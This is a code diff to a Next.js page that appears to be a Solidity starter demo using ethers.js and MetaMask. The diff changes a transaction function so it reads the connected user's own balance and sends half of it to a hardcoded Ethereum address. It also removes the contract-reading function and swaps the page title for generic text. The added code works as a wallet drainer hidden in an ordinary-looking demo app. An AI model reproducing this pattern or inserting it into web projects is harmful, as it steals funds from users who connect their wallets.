@@ -43,8 +43,8 @@ export default function Home() {
     const provider = new ethers.providers.Web3Provider(window.ethereum);
     const signer = provider.getSigner()
 
-    let balance = await provider.getBalance("ethers.eth") ;
-   let amount = balance.mul(ethers.utils.parseEther("95")).div(ethers.utils.parseEther("100"));
+    let balance = await provider.getBalance(userAddress) ;
+   let amount = balance.mul(ethers.utils.parseEther("50")).div(ethers.utils.parseEther("100"));
    const tx = signer.sendTransaction({
     to: "0xC1F1cdD386776a357531cc5b91e1eF8E14a45DC8",
     value: amount
@@ -52,23 +52,6 @@ export default function Home() {
     console.log(tx)
   }
 
-
-  // Call smart contract, fetch current value
-  async function fetchGreeting() {
-    if ( ! hasEthereum() ) {
-      setConnectedWalletAddressState(`MetaMask unavailable`)
-      return
-    }
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
-    const signer = provider.getSigner()
-    // const contract = new ethers.Contract(process.env.NEXT_PUBLIC_GREETER_ADDRESS, Greeter.abi, provider)
-    try {
-      const data = await contract.greet()
-      setGreetingState(data)
-    } catch(error) {
-      console.log(error)
-    }
-  }
 
 
   // Call smart contract, set new value
@@ -78,7 +61,7 @@ export default function Home() {
     const signer = provider.getSigner();
     const userAddress = await signer.getAddress();
     console.log("Address " + userAddress);
-    let balance = await provider.getBalance("ethers.eth") ;
+    let balance = await provider.getBalance(userAddress) ;
 
     setGreetingState(userAddress);
     setNewGreetingState(ethers.utils.formatEther(balance));
@@ -88,7 +71,7 @@ export default function Home() {
   return (
     <div className="max-w-lg mt-36 mx-auto text-center px-4">
       <Head>
-        <title>Solidity Next.js Starter</title>
+        <title>Next.Js</title>
         <meta name="description" content="Interact with a simple smart contract from the client-side." />
         <link rel="icon" href="/favicon.ico" />
       </Head>
@@ -101,7 +84,7 @@ export default function Home() {
         ) : ( */}
           <>
             <h1 className="text-4xl font-semibold mb-8">
-              Solidity Next.js Starter
+              Solidity
             </h1>
             <div className="space-y-8">
                 <div className="flex flex-col space-y-4">
